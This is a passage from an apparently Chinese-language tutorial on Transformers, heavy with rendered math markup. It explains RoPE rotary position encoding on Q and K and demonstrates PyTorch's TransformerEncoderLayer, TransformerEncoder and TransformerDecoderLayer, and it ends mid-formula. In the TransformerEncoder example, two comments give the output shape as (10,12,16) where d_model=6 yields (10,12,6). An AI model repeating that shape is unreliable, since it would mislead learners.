class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.05764em;">PE</span><span class="mopen">(</span><span class="mord mathnormal">Q</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.05764em;">PE</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">)</span></span></span></span></span>)就行，其它的操作流程完全不变，注意<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></span>矩阵不需要进行RoPE变换，并且RoPE旋转位置编码应该在编码器的每一层都对<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span></span></span></span></span>和<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span></span>应用。这样就可以去掉原始论文的架构图上的位置编码操作了。</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>Q</mi><mo>=</mo><mi>X</mi><mo>⋅</mo><msub><mi>W</mi><mi>q</mi></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>K</mi><mo>=</mo><mi>X</mi><mo>⋅</mo><msub><mi>W</mi><mi>k</mi></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>V</mi><mo>=</mo><mi>X</mi><mo>⋅</mo><msub><mi>W</mi><mi>v</mi></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{matrix}
Q = X\cdot W_{q} &amp; (seq\_len,k)
 \\
K = X\cdot W_{k} &amp; (seq\_len,k)
 \\
V = X\cdot W_{v} &amp; (seq\_len,out\_size) 
\end{matrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>Q</mi><mo>=</mo><mi>R</mi><mi>o</mi><mi>P</mi><mi>E</mi><mo stretchy="false">(</mo><mi>Q</mi><mo stretchy="false">)</mo><mspace linebreak="newline"/><mi>K</mi><mo>=</mo><mi>R</mi><mi>o</mi><mi>P</mi><mi>E</mi><mo stretchy="false">(</mo><mi>K</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Q = RoPE(Q)\\
K = RoPE(K)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.05764em;">PE</span><span class="mopen">(</span><span class="mord mathnormal">Q</span><span class="mclose">)</span></span><span class="mspace newline"/><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.05764em;">PE</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">)</span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mo>=</mo><mfrac><mrow><mi>Q</mi><mo>⋅</mo><msup><mi>K</mi><mi>T</mi></msup></mrow><msqrt><mi>k</mi></msqrt></mfrac><mtext>   </mtext><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P = \frac{Q \cdot K^T }{\sqrt{k}}\space\space\space (seq\_len,seq\_len)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.4483em;vertical-align:-0.93em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5183em;"><span style="top:-2.1778em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9322em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord" style="padding-left:0.833em;"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span><span style="top:-2.8922em;"><span class="pstrut" style="height:3em;"/><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewbox="0 0 400000 1080" preserveaspectratio="xMinYMin slice"><path d="M95,702&#10;c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14&#10;c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54&#10;c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10&#10;s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429&#10;c69,-144,104.5,-217.7,106.5,-221&#10;l0 -0&#10;c5.3,-9.3,12,-14,20,-14&#10;H400000v40H845.2724&#10;s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7&#10;c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z&#10;M834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1078em;"><span/></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.93em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace"> </span><span class="mspace"> </span><span class="mspace"> </span><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></div>
<p>如果你想对RoPE有更加深层次的理解，非常推荐观看<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1CQoaY2EU2%2F" target="_blank" title="https://www.bilibili.com/video/BV1CQoaY2EU2/" ref="nofollow noopener noreferrer">作者武辰</a>的视频讲解</p>
<p>不要看到RoPE这么复杂就感到害怕，你只需把握一个核心本质：<strong>它们本质上都是对原始注意力分数矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><msup><mi>K</mi><mi>T</mi></msup></mrow><annotation encoding="application/x-tex">QK^T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0358em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span></span> 进行修正。</strong> 无论具体操作是加一个偏置项，还是对查询和键进行旋转，其根本目的都是变着法子让模型建立起“距离”与“关注度”之间的关系：让相距较远的词对（对应的 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">qk</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> 注意力分数）受到抑制，让相距较近的词对得到增强。</p>
<p>可以用下面这个图来简单的理解，距离越远的词，其注意力权重就会乘以一个越小系数</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ecf8b23bae1046569b9fd217742a106f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=cYTKzX9CdeyeBiG8d3NWJ5Bfo%2F8%3D" alt="c19.jpg" width="90%" loading="lazy"/></p>
<p>只要你理解了这个本质，未来你也可以设计一个新的位置编码算法。</p>
<h3 data-id="heading-2">附录2：Pytorch中的Transformer组件</h3>
<blockquote>
<p>如何用Pytorch快速搭建Transformer中的组件？其实Pytorch中有现成的Transformer组件函数，都打包好了，可以直接调用，下面就一一讲解，若想更加深入的理解学习，推荐自行查阅<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.pytorch.org%2Fdocs%2Fstable%2Fgenerated%2Ftorch.nn.TransformerEncoderLayer.html" target="_blank" title="https://docs.pytorch.org/docs/stable/generated/torch.nn.TransformerEncoderLayer.html" ref="nofollow noopener noreferrer">官方手册</a></p>
</blockquote>
<p><strong>a2.1 TransformerEncoderLayer</strong></p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51d3d730aa5b447391c682b9dc94a6ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=9kF02SJHbNkw%2FJxbVae59qxLv10%3D" alt="a1.jpg" width="70%" loading="lazy"/></p>
<p><strong>初始化参数：</strong></p>
<ul>
<li><code>d_model</code>: 输入序列的特征数量</li>
<li><code>nhead</code>: 多头注意力的头数量</li>
<li><code>dim_feedforward</code>: 前向传播隐藏层数量,默认值为2048</li>
<li><code>batch_first</code>: 输入输出维度顺序，默认False，但一般情况下强制其为True</li>
<li><code>dropout</code>: 默认为0.1</li>
<li><code>activation</code>: 激活函数，默认为<code>relu</code>,还可以使用<code>gelu</code>（gelu对序列任务表现较好，但是计算量大）</li>
</ul>
<p><strong>输入矩阵形状：</strong><code> (batch_size, seq_len, d_model)</code></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 使用示例</span>
encoder_layer = nn.TransformerEncoderLayer(d_model=<span class="hljs-number">6</span>, nhead=<span class="hljs-number">6</span>,batch_first=<span class="hljs-literal">True</span>,activation=<span class="hljs-string">"gelu"</span>)
inputs = torch.rand(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">6</span>)
output = encoder_layer(inputs)
output.shape	<span class="hljs-comment"># 输出(1,10,6)</span>
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 添加掩码</span>
seq_len = <span class="hljs-number">10</span>  <span class="hljs-comment"># 序列长度</span>
<span class="hljs-comment"># 创建上三角掩码 (对角线以上为True)</span>
src_mask = torch.triu(torch.ones(seq_len, seq_len), diagonal=<span class="hljs-number">1</span>).<span class="hljs-built_in">bool</span>()
output = encoder_layer(inputs, src_mask=src_mask)
output.shape	<span class="hljs-comment"># 输出(1,10,6)</span>
</code></pre>
<p>注意：Transformer编码器(Encoder)通常不需要上三角掩码，因为编码器应该能够看到整个输入序列。上三角掩码(因果掩码)通常是用于解码器(Decoder)中，防止模型在预测时看到未来的信息</p>
<p><strong>a2.2 TransformerEncoder</strong></p>
<p>多个TransformerEncoderLayer堆叠结构</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/928ff01c73a349709830f5cf1fb28f52~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=tZ85%2FBLoWN9CSlMU1BsNk%2F1ac%2F8%3D" alt="a2.jpg" loading="lazy"/></p>
<p><strong>初始化参数：</strong></p>
<ul>
<li>
<p><code>encoder_layer</code>: 一个TransformerEncoderLayer层实例</p>
</li>
<li>
<p><code>num_layers</code>: 几个TransformerEncoderLayer层堆叠</p>
</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 使用示例</span>
encoder_layer = nn.TransformerEncoderLayer(
    d_model=<span class="hljs-number">6</span>, nhead=<span class="hljs-number">6</span>, batch_first=<span class="hljs-literal">True</span>, activation=<span class="hljs-string">"gelu"</span>
)	<span class="hljs-comment"># 先初始化一个TransformerEncoderLayer实例</span>
transformer_encoder = nn.TransformerEncoder(encoder_layer, num_layers=<span class="hljs-number">4</span>)    <span class="hljs-comment"># 4层堆叠</span>
inputs = torch.rand(<span class="hljs-number">10</span>, <span class="hljs-number">12</span>, <span class="hljs-number">6</span>)
outputs = transformer_encoder(inputs)
outputs.shape	<span class="hljs-comment"># 输出(10,12,16)</span>
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 添加掩码，注意，一般在编码器中不加掩码</span>
seq_len = <span class="hljs-number">12</span>  <span class="hljs-comment"># 序列长度</span>
mask = torch.triu(torch.ones(seq_len, seq_len), diagonal=<span class="hljs-number">1</span>).<span class="hljs-built_in">bool</span>()
output = transformer_encoder(inputs, mask=mask)
output.shape	<span class="hljs-comment"># 输出(10,12,16)</span>
</code></pre>
<p><strong>a2.3 TransformerDecoderLayer</strong></p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15ebbc8621ab451eb8749e1d866e289a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=nHlfIlCKvEZU5fSqPcMssTi9TaY%3D" alt="a3.jpg" loading="lazy"/></p>
<p><strong>初始化参数：</strong></p>
<ul>
<li><code>d_model</code>: 输入序列的特征数量</li>
<li><code>nhead</code>: 多头注意力的头数量</li>
<li><code>dim_feedforward</code>: 前向传播隐藏层数量,默认值为2048</li>
<li><code>batch_first</code>: 输入输出维度顺序，默认False，但一般情况下强制其为True</li>
<li><code>dropout</code>: 默认为0.1</li>
<li><code>activation</code>: 激活函数，默认为<code>relu</code>,还可以使用<code>gelu</code>（gelu对序列任务表现较好，但是计算量大）</li>
</ul>
<p><strong>输入矩阵形状：</strong> <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>=</mo><mo stretchy="false">(</mo><mi>b</mi><mi>a</mi><mi>t</mi><mi>c</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><msub><mi>n</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>d</mi><mi mathvariant="normal">_</mi><mi>m</mi><mi>o</mi><mi>d</mi><mi>e</mi><mi>l</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub><mo>=</mo><mo stretchy="false">(</mo><mi>b</mi><mi>a</mi><mi>t</mi><mi>c</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><msub><mi>n</mi><mn>2</mn></msub><mo separator="true">,</mo><mi>d</mi><mi mathvariant="normal">_</mi><mi>m</mi><mi>o</mi><mi>d</mi><mi>e</mi><mi>l</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">X = (batch\_ size, seq\_ len_{1}, d\_ model),Y_{out} = (batch\_ size, seq\_len_{2}, d\_ model)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">ba</span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">ba</span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span 